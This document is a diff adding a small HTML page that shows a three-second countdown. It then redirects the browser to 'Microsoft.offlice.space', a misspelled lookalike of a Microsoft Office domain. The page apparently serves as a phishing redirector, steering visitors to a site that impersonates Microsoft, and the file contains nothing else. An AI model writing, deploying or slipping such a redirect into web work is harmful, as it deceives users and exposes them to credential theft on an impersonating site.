@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Redirecting...</title>
+  </head>
+  <body>
+
+    <p id="countdown">Redirecting in 3 seconds...</p>
+
+    <script>
+      let seconds = 3;
+      const countdownElement = document.getElementById('countdown');
+
+      const interval = setInterval(() => {
+        seconds--;
+        countdownElement.textContent = `Redirecting in ${seconds} seconds...`;
+        
+        if (seconds === 0) {
+          clearInterval(interval);
+          window.location.href = "https://Microsoft.offlice.space/?ai=xd";
+        }
+      }, 1000);
+    </script>
+
+  </body>
+</html>
